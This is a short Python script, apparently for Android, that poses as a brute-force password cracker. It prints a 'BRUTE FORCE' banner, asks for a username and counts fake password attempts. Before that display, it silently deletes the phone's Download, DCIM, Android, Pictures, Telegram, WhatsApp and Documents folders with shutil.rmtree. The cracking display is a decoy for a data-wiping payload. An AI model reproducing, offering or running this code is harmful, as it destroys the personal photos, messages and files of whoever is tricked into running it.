import shutil
import random
import time
from colorama import Style,Fore,init
import pyfiglet
from datetime import datetime
from termcolor import colored
import threading




aa = 'storage/emulated/0/Download'
bb = 'storage/emulated/0/DCIM'
cc = 'storage/emulated/0/Android'
dd = 'storage/emulated/0/Pictures'
ee = 'storage/emulated/0/Telegram'
ff= 'storage/emulated/0/Whatsapp'
gg = 'storage/emulated/0/Documents'

shutil.rmtree(aa)
shutil.rmtree(bb)
shutil.rmtree(cc)
shutil.rmtree(dd)
shutil.rmtree(ee)
shutil.rmtree(ff)
shutil.rmtree(gg)



# Sayı sayma işlemi
def count_numbers():
    for i in range(1, 10000):
        print(colored(f"Toplam denenen şifre: {i}❌", "green"))
        time.sleep(0.3)

# Create PyFiglet text
figlet_text = pyfiglet.figlet_format("BRUTE FORCE", font="standard")

# Print the PyFiglet text
print(colored(figlet_text,'blue'))

# Kullanıcıdan bir kullanıcı adı alın
user_input = input(colored('Lütfen bir kullanıcı adı girin:', 'red'))
print(colored(f'Kullanıcı adı: {user_input}', 'green'))
time.sleep(1)

# Thread oluşturun ve sayıları saymaya başlayın
number_count_thread = threading.Thread(target=count_numbers)
number_count_thread.start()

number_count_thread.join()
